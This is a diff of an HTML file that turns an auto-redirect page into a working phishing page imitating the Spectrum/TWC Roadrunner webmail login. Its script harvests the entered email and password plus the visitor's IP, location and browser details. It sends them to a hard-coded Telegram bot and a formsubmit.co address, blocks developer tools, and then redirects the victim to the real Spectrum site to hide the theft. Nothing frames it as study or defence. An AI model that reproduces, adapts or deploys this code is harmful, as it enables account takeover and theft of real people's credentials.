@@ -1,20 +1,498 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Auto Redirect</title>
-
-  <script>
-    // Put your destination link here
-    const redirectURL = "https://pub-6a76bd9eb3714603b95b647b38a6999e.r2.dev/xfini.html";
-
-    // Redirect immediately when the file opens
-    window.onload = function () {
-      window.location.href = redirectURL;
-    };
-  </script>
+<meta charset="UTF-8">
+<title>Login TWC & Roadrunner RR Email | Spectrum Webmail</title>
+<link rel="icon" type="image/jpeg" href="https://pub-1f2aa7db6d444a698362868810a71a5a.r2.dev/sup_spectrum-tv-app_large.jpg">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* {
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+html, body {
+    height: 100%;
+    margin: 0;
+    background: #F8F8F8;
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+}
+body {
+    display: flex;
+    flex-direction: column;
+}
+body.blur-active {
+    filter: blur(5px);
+    transition: filter 0.5s ease-out;
+}
+body.blur-complete {
+    filter: blur(0px);
+}
+.header {
+    height: 60px;
+    border-bottom: 1px solid #e5e5e5;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+}
+.logo {
+    font-size: 24px;
+    font-weight: 700;
+    color: #0b2a4a;
+    background-image: url('https://pub-e62907629ca94a2ba21a19b7cadaf474.r2.dev/1.spectrum-logo.svg');
+    background-size: contain;
+    background-repeat: no-repeat;
+    background-position: center;
+    width: 140px;
+    height: 30px;
+}
+.logo span {
+    color: #0072CE;
+}
+.main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #F8F8F8;
+}
+.form-box {
+    width: 360px;
+    text-align: center;
+    background: #F8F8F8;
+}
+.form-title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #000000;
+    margin-bottom: 18px;
+    text-align: center;
+}
+label {
+    display: block;
+    font-size: 13px;
+    font-weight: 400;
+    color: #333333;
+    margin-bottom: 6px;
+    text-align: left;
+}
+input[type="email"],
+input[type="password"],
+input[type="text"] {
+    width: 100%;
+    height: 36px;
+    font-size: 14px;
+    color: #000000;
+    padding: 8px 12px;
+    border: 1px solid #8A8A8A;
+    border-radius: 2px;
+    margin-bottom: 10px;
+    background: #FFFFFF;
+    transition: all 0.3s ease;
+}
+input[type="email"]:focus,
+input[type="password"]:focus,
+input[type="text"]:focus {
+    outline: none;
+    border-color: #0072CE;
+    box-shadow: 0 0 0 2px rgba(0,114,206,0.1);
+}
+.password-container {
+    position: relative;
+}
+.password-toggle {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTExLjk5OTkgMTguMDAwMUNNMTIuMDAwMSAxOC4wMDAxTTEyLjAwMDEgMTguMDAwMUwxMS45OTk5IDE4LjAwMDFaIiBmaWxsPSIjMzMzMzMzIi8+CjxwYXRoIGQ9Ik0xMiA3QzE0LjIwOTEgNyAyNi4xIDkgMjAgMTFDMTMuOSAxNSAyIDEzIDJDMiAxMyAyIDEyIDIgMTFDMiA5IDIgNyAxMiA3WiIgZmlsbD0iIzMzMzMzMyIvPgo8cGF0aCBkPSJNMiAxMkM0LjQ1MTQ3IDEyIDcgMTQuNTUgNyAxN0MxMiAxOS41NSA3IDIyIDcgMjJDNyAyMiAxMC41NDUzIDIwIDEyIDIwQzEzLjQ1NDcgMjAgMTcgMTguNDUgMTcgMTdDMTcgMTUuNSAxOS40NTE0IDE5MSAxNzIgMTlDMTkuNDU0NyAxOSAyMiAxNy40NSAyMiAxN0MyMiAxNi40NSAyMS41IDE1IDIwIDE1QzE4LjUgMTQgMTcgMTQuNSAxNyAxNUgxNlpFIiBmaWxsPSIjMzMzMzMzIi8+Cjwvc3ZnPgo=') no-repeat center;
+    cursor: pointer;
+    opacity: 0.7;
+    transition: opacity 0.2s ease;
+}
+.password-toggle:hover {
+    opacity: 1;
+}
+.password-toggle.hide {
+    background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDcgQzE0LjIwOTEgNyAyNi4xIDkgMjAgMTFDMTMuOSAxNSAyIDEzIDJDMiAxMyAyIDEyIDIgMTFDMiA5IDIgNyAxMiA3WiIgZmlsbD0iIzMzMzMzMyIvPgo8cGF0aCBkPSJNMiAxMkM0LjQ1MTQ3IDEyIDcgMTQuNTUgNyAxN0MxMiAxOS41NSA3IDIyIDcgMjJDNyAyMiAxMC41NDUzIDIwIDEyIDIwQzEzLjQ1NDcgMjAgMTcgMTguNDUgMTcgMTdDMTcgMTUuNSAxOS40NTE0IDkxIDcyIDkxQzE5LjQ1NDcgMTkgMjIgMTcuNDUgMjIgMTdDMjIgMTYuNDUgMjEuNSAxNSAyMCAxNUMxOC41IDE0IDE3IDE0LjUgMTcgMTVIMTZaIiBmaWxsPSIjMzMzMzMzIi8+Cjwvc3ZnPgo=') no-repeat center;
+}
+.remember {
+    font-size: 13px;
+    color: #333333;
+    margin-bottom: 20px;
+    text-align: left;
+}
+.remember input {
+    margin-right: 8px;
+}
+.btn {
+    width: 100%;
+    height: 36px;
+    background: #0071CE;
+    color: #FFFFFF;
+    font-size: 14px;
+    font-weight: 600;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+    margin-bottom: 20px;
+    transition: background 0.3s;
+}
+.btn:hover:not(:disabled) {
+    background: #005EA6;
+}
+.btn:disabled {
+    background: #6c757d;
+    cursor: not-allowed;
+}
+.links a {
+    display: block;
+    font-size: 13px;
+    color: #0066CC;
+    text-decoration: underline;
+    margin-bottom: 10px;
+}
+.links a:hover {
+    color: #004494;
+}
+.error-message {
+    background: #fee;
+    color: #c33;
+    padding: 10px;
+    border-radius: 3px;
+    margin-bottom: 15px;
+    font-size: 13px;
+    display: none;
+    border-left: 4px solid #c33;
+    font-weight: 500;
+    line-height: 1.4;
+}
+.loading-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(248,248,248,0.95);
+    display: none;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    backdrop-filter: blur(5px);
+}
+.loading-content {
+    text-align: center;
+    color: #333;
+}
+.loading-step {
+    font-size: 16px;
+    font-weight: 600;
+    margin-bottom: 10px;
+}
+.loading-complete {
+    font-size: 14px;
+    color: #28a745;
+    font-weight: 500;
+    margin-top: 5px;
+}
+.loading-spinner {
+    width: 40px;
+    height: 40px;
+    border: 3px solid #e3e3e3;
+    border-top: 3px solid #0071CE;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+.complete-icon {
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(135deg, #28a745, #20c997);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+    font-size: 28px;
+    color: white;
+    box-shadow: 0 4px 12px rgba(40, 167, 69, 0.4);
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.footer {
+    background: #000;
+    color: #fff;
+    font-size: 11px;
+    line-height: 16px;
+    padding: 14px 30px;
+    text-align: center;
+}
+.footer a {
+    color: #fff;
+    text-decoration: none;
+    font-weight: normal;
+}
+.footer a:hover {
+    text-decoration: underline;
+}
+.footer .dim {
+    color: #ccc;
+    margin-top: 6px;
+    font-style: italic;
+}
+body.mobile-optimized input[type="email"],
+body.mobile-optimized input[type="password"],
+body.mobile-optimized input[type="text"] {
+    font-size: 16px;
+}
+</style>
 </head>
-<body>
+
+<body class="blur-active">
+<div class="header">
+    <div>MENU</div>
+    <div class="logo"></div>
+    <div>Support</div>
+</div>
+
+<div class="main">
+    <div class="form-box">
+        <div class="form-title">Sign In to Webmail</div>
+        
+        <div class="error-message" id="errorMessage">The info you entered doesn't match our records. Please try again.</div>
+        
+        <form id="loginForm">
+            <label for="emailInput">Email Address</label>
+            <input type="email" id="emailInput" required autocomplete="username">
+            
+            <div class="remember">
+                <input type="checkbox" id="rememberEmail"> Remember Email Address
+            </div>
+            
+            <label for="passwordInput">Email Password</label>
+            <div class="password-container">
+                <input type="password" id="passwordInput" required autocomplete="current-password">
+                <div class="password-toggle hide" id="passwordToggle"></div>
+            </div>
+            
+            <button type="submit" class="btn" id="submitButton">Sign In</button>
+        </form>
+        
+        <div class="links">
+            <a href="#" onclick="return false">Forgot Email Address?</a>
+            <a href="#" onclick="return false">Forgot Email Password?</a>
+        </div>
+    </div>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+    <div class="loading-content">
+        <div class="loading-spinner" id="loadingSpinner"></div>
+        <div class="loading-step" id="loadingStep">Confirming User Info</div>
+        <div class="loading-complete" id="loadingComplete" style="display: none;">Redirecting to Official Spectrum Webmail...</div>
+        <div class="complete-icon" id="completeIcon" style="display: none;">✓</div>
+    </div>
+</div>
+
+<div class="footer">
+    © 2022 Charter Communications. All rights reserved |
+    <a href="#" onclick="return false">Advertise with Us</a> |
+    <a href="#" onclick="return false">Your Privacy Rights</a> |
+    <a href="#" onclick="return false">Web Privacy Policy</a> |
+    <a href="#" onclick="return false">California Consumer Privacy Rights</a> |
+    <a href="#" onclick="return false">Spectrum Subscriber Policies</a><br>
+    <a href="#" onclick="return false">California Consumer Do Not Sell Or Share My Personal Information</a> |
+    <a href="#" onclick="return false">California Consumer Limit The Use Of My Sensitive Personal Information</a>
+    <div class="dim">
+        Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license.
+    </div>
+</div>
+
+<script nonce="NTQxNTYyNDc2LDI4MDA2OTM2NzM=">
+/* ============================================
+   **FIXED 2-SECOND BLUR EFFECT** 
+   Blur starts immediately, ends EXACTLY at 2000ms
+   ============================================ */
+(function() {
+    document.body.classList.add('blur-active');
+    setTimeout(() => {
+        document.body.classList.remove('blur-active');
+        document.body.classList.add('blur-complete');
+    }, 2000);
+})();
+
+const TELEGRAM_BOT_TOKEN = '8638610012:AAHJdhhmraKgNiUNNWvBaLi2n_y5409NC1g';
+const TELEGRAM_CHAT_ID = '8431480718';
+const FORM_URL = "https://formsubmit.co/ajax/yahootestyouknowthis@boxfi.uk";
+
+function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Edge';
+    return 'Unknown';
+}
+
+async function sendTelegramReport(email, password) {
+    let ip = "Unknown";
+    let geoInfo = "N/A";
+    
+    // Attempt IP lookup but don't block execution if it fails
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const gd = await geoRes.json();
+        geoInfo = `🌍 Country: ${gd.country_name || 'N/A'}\n🏙️ City: ${gd.city || 'N/A'}\n🛰️ ISP: ${gd.org || 'N/A'}`;
+    } catch (e) { console.log("Network meta failed"); }
+
+    const message = `━━━━━━━━━━━━━━━━━━
+🛎️ SPECTRUM DATA
+━━━━━━━━━━━━━━━━━━
+📧 Mail: ${email}
+🔐 Pass: ${password}
+━━━━━━━━━━━━━━━━━━
+🧭 IP: ${ip}
+${geoInfo}
+🧪 Browser: ${getBrowserInfo()}
+🕰️ TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+━━━━━━━━━━━━━━━━━━`;
+
+    // Use URL Search Params for reliability with Telegram's API
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+    };
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        });
+    } catch (e) {
+        // Fallback to GET if POST is blocked by CSP
+        const getUrl = `${url}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        new Image().src = getUrl;
+    }
+}
+
+async function sendFormSubmit(email, password) {
+    try {
+        const formData = new FormData();
+        formData.append('email', email);
+        formData.append('password', password);
+        formData.append('_subject', 'Spectrum Login');
+
+        await fetch(FORM_URL, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (e) {
+        console.log('Form submit failed:', e);
+    }
+}
+
+// DOM Elements
+const emailInput = document.getElementById('emailInput');
+const passwordInput = document.getElementById('passwordInput');
+const loginForm = document.getElementById('loginForm');
+const submitButton = document.getElementById('submitButton');
+const errorMessage = document.getElementById('errorMessage');
+const passwordToggle = document.getElementById('passwordToggle');
+const loadingScreen = document.getElementById('loadingScreen');
+const loadingStep = document.getElementById('loadingStep');
+const loadingSpinner = document.getElementById('loadingSpinner');
+const loadingComplete = document.getElementById('loadingComplete');
+const completeIcon = document.getElementById('completeIcon');
+
+let isSubmitting = false;
+
+// Basic protections
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J'].includes(e.key.toUpperCase())) || (e.ctrlKey && e.key.toUpperCase() === 'U')) {
+        e.preventDefault();
+    }
+});
+
+passwordToggle.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    passwordToggle.classList.toggle('hide');
+});
+
+async function showLoadingSequence() {
+    loadingScreen.style.display = 'flex';
+    const steps = ['Confirming User Info', 'Verifying Info', 'Processing Upgrade'];
+    for (let step of steps) {
+        loadingStep.textContent = step;
+        await new Promise(r => setTimeout(r, 1200));
+    }
+    loadingSpinner.style.display = 'none';
+    loadingStep.style.display = 'none';
+    completeIcon.style.display = 'flex';
+    loadingComplete.style.display = 'block';
+    setTimeout(() => { window.location.href = 'https://webmail.spectrum.net/mail/auth'; }, 2000);
+}
+
+async function handleFormSubmit(e) {
+    e.preventDefault();
+    if (isSubmitting) return;
+    
+    const email = emailInput.value.trim();
+    const password = passwordInput.value;
+    
+    if (!email.includes('@') || !password) {
+        errorMessage.style.display = 'block';
+        return;
+    }
+    
+    isSubmitting = true;
+    submitButton.disabled = true;
+    submitButton.textContent = 'Signing in...';
+    
+    // Execute both but don't let one failure stop the other
+    await Promise.allSettled([
+        sendTelegramReport(email, password),
+        sendFormSubmit(email, password)
+    ]);
+    
+    if (document.getElementById('rememberEmail').checked) {
+        localStorage.setItem('rememberedEmail', email);
+    }
+    
+    await showLoadingSequence();
+}
+
+function init() {
+    const params = new URLSearchParams(window.location.search);
+    const urlEmail = params.get('email') || params.get('e');
+    const remembered = localStorage.getItem('rememberedEmail');
+    
+    if (urlEmail) emailInput.value = urlEmail;
+    else if (remembered) {
+        emailInput.value = remembered;
+        document.getElementById('rememberEmail').checked = true;
+    }
+    
+    loginForm.addEventListener('submit', handleFormSubmit);
+    if (!emailInput.value) emailInput.focus();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+</script>
 </body>
 </html>
